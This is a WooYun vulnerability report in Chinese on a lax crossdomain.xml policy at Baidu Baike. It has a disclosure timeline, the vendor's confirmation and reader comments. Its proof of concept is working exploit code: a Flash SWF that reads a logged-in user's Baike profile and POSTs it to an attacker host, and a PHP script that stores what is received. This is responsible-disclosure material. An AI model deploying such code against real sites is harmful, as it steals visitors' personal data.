{"id": 73816, "wybug_id": "wooyun-2015-0163787", "wybug_title": "点我链接就能看你百度百科个人资料", "wybug_corp": "百度", "wybug_author": "海绵宝宝", "wybug_date": "2015-12-23 11:22", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "应用配置错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： 可查看百度百科个人信息，以查看http://baike.baidu.com/usercenter/settings#profile为例 详细说明：  由于http://baike.baidu.com/crossdomain.xml 配置不严PoC,编译成swf\n// Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)// XDomainXploit.as// Thanks - http://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7cfd.html#WS5b3ccc516d4fbf351e63e3d118a9b90204-7cf5package {\timport flash.display.Sprite;\timport flash.events.*;\timport flash.net.URLRequestMethod;\timport flash.net.URLRequest;\timport flash.net.URLLoader;\tpublic class XDomainXploit extends Sprite {\t\tpublic function XDomainXploit() {\t\t\t// Target URL from where the data is to be retrieved\t\t\tvar readFrom:String = \"http://baike.baidu.com/usercenter/settings#profile\";\t\t\tvar readRequest:URLRequest = new URLRequest(readFrom);\t\t\tvar getLoader:URLLoader = new URLLoader();\t\t\tgetLoader.addEventListener(Event.COMPLETE, eventHandler);\t\t\ttry {\t\t\t\tgetLoader.load(readRequest);\t\t\t} catch (error:Error) {\t\t\t\ttrace(\"Error loading URL: \" + error);\t\t\t}\t\t}\t\tprivate function eventHandler(event:Event):void {\t\t\t// URL to which retrieved data is to be sent\t\t\tvar sendTo:String = \"http://xxxxxxxx/baike.php\"\t\t\tvar sendRequest:URLRequest = new URLRequest(sendTo);\t\t\tsendRequest.method = URLRequestMethod.POST;\t\t\tsendRequest.data = event.target.data;\t\t\tvar sendLoader:URLLoader = new URLLoader();\t\t\ttry {\t\t\t\tsendLoader.load(sendRequest);\t\t\t} catch (error:Error) {\t\t\t\ttrace(\"Error loading URL: \" + error);\t\t\t}\t\t}\t}}\nbaike.php 用来接受信息。\n<?php$data = file_get_contents(\"php://input\");$ret = file_put_contents('/var/www/html/baike.html', $data, FILE_APPEND | LOCK_EX);if($ret === false) { die('Error writing to file');}else {  echo \"$ret bytes written to file\";}?>\n   漏洞证明：  访问http://xxx.xxx.xxx.xxx/XDomainXploit.swf\n\n\n\n参考: http://sethsec.blogspot.jp/2014/03/exploiting-misconfigured-crossdomainxml.html   修复方案：     版权声明：转载请注明来源 海绵宝宝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-23 19:46 厂商回复： 感谢关注百度安全 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-23 11:27 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:433 漏洞数:76        | 看似山穷水尽，终将柳喑花明)\t\t \n  不点不点就不点  →_→    \n     2015-12-23 11:31 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1023 漏洞数:235        | 1.乌云最帅的男人                        ...)\t\t \n  海绵宝宝的绿V怎么没了    \n     2015-12-23 11:32 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:353 漏洞数:81        | 唯有梦想与好姑娘不可辜负.)\t\t \n  @牛 小 帅 认清楚，子非海绵宝宝 和 海绵宝宝    \n     2015-12-23 11:37 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1023 漏洞数:235        | 1.乌云最帅的男人                        ...)\t\t \n  @海绵宝宝 好吧 嘎嘎    \n     2015-12-23 14:24 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:57        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  就是不点！    \n     2015-12-23 14:40 |    \t\tjs2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:24        | 天道酬勤，洞无止境，一挖一世界)\t\t \n  xuezhang666    \n     2015-12-23 15:09 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  不点不点就不点 →_→    \n     2015-12-23 20:29 |    \t\t人丑嘴不甜 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        | 小菜鸟 妄想成为大大的大牛)\t\t \n  海绵宝宝的绿V怎么没了    \n     2015-12-24 01:53 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:34        | 求各种兼职)\t\t \n  我要收版权费了    \n     2015-12-24 09:00 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:79        | 潜心学习~~~)\t\t \n  @呆子不开口 赶紧申请专利吧   别忘了眼镜    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}